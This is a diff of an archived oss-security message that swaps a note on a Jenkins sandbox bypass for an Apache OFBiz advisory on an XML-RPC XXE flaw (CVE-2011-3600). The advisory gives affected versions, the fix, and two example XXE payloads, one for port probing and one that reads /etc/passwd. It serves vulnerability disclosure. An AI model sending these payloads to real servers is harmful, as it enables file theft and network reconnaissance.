@@ -1,23 +1,61 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/12/10/2
-Message-Id: <DEF7ECE9-A4B6-46B2-8485-481FCE9D138D@beckweb.net>
-Date: Mon, 10 Dec 2018 01:50:37 +0100
-From: Daniel Beck <ml@...kweb.net>
-To: oss-security@...ts.openwall.com
-Subject: Re: Script sandbox bypass in multiple Jenkins plugins
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/05/2
+Message-ID: <fad45546-af86-0293-9ea7-014553474b30@apache.org>
+Date: Fri, 5 Oct 2018 15:52:23 +0300
+From: Taher Alkhateeb <slidingfilaments@...il.com>
+To: user@...iz.apache.org, dev@...iz.apache.org, security@...iz.apache.org, security@...che.org, announce@...che.org, oss-security@...ts.openwall.com, jamesp@...dpointgroup.com
+Subject: [SECURITY] CVE-2011-3600 Apache OFBiz XML-RPC XXE Vulnerability
 Content-Type: text/plain; charset=utf-8
 
+Severity:
+Important
 
+Vendor:
+The Apache Software Foundation
 
-> On 29. Oct 2018, at 14:42, Daniel Beck <ml@...kweb.net> wrote:
-> 
-> SECURITY-1186
-> The Groovy Sandbox library used by Script Security Plugin and Pipeline Groovy
-> Plugin did not apply sandbox restrictions to finalize methods. This could be
-> used to invoke arbitrary constructors and methods, bypassing sandbox
-> protection.
-> 
-> Finalize methods are now prohibited in classes subject to sandbox security.
+Versions Affected:
+OFBiz 16.11.01 to 16.11.04
 
-CVE-2018-1000865 (Script Security Plugin) and CVE-2018-1000866 (Pipeline: Groovy Plugin)
+Description:
+The OFBiz XML-RPC event handler 
+(org.apache.ofbiz.webapp.event.XmlRpcEventHandler.java)
+acts as a wrapper for any OFBiz service that provides XML-RPC web 
+services via
+the /webtools/control/xmlrpc endpoint. This endpoint is exposed to External
+Entity Injection by passing DOCTYPE declarations with executable 
+payloads that
+discloses the contents of files in the filesystem. In addition, it can 
+also be
+used to probe for open network ports, and figure out from returned error
+messages whether a file exists or not.
+
+Mitigation:
+Upgrade to 16.11.05
+or manually apply the following commits on branch 16
+r1833724
+r1833708
+r1836141
+
+Example:
+# Payload to find an exposed port
+<?xml version="1.0"?>
+<!DOCTYPE x SYSTEM "http://localhost:8080">
+<methodCall>
+     <methodName>ping</methodName>
+</methodCall>
+
+# Payload to display file contents
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY disclose SYSTEM "file:///etc/passwd">
+]>
+<methodCall>
+     <methodName>&disclose;</methodName>
+</methodCall>
+
+Credit:
+James Parfet <jamesp at mindpointgroup.com>
+
+References:
+http://ofbiz.apache.org/download.html#vulnerabilities
 
